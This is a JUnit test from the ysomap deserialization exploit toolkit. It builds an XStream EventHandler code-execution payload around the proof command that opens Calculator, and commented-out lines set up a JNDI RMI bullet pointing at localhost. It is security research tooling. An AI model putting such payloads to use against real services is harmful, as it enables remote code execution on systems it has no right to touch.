package ysomap.core.payload.xstream;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;

/**
 * @author wh1t3P1g
 * @since 2020/4/16
 */
public class EventHandlerTest {

    @Test
    public void pack() throws Exception {
        Payload treeset = new EventHandler();
        Bullet bullet = treeset.getDefaultBullet("open /System/Applications/Calculator.app");
//        Bullet bullet = new JdbcRowSetImplBullet();
//        bullet.set("jndiURL","rmi://localhost:1099/test");
        treeset.setBullet(bullet);
//        Serializer serializer = treeset.getSerializer();
//        serializer.deserialize(serializer.serialize(treeset.getObject()));
    }
}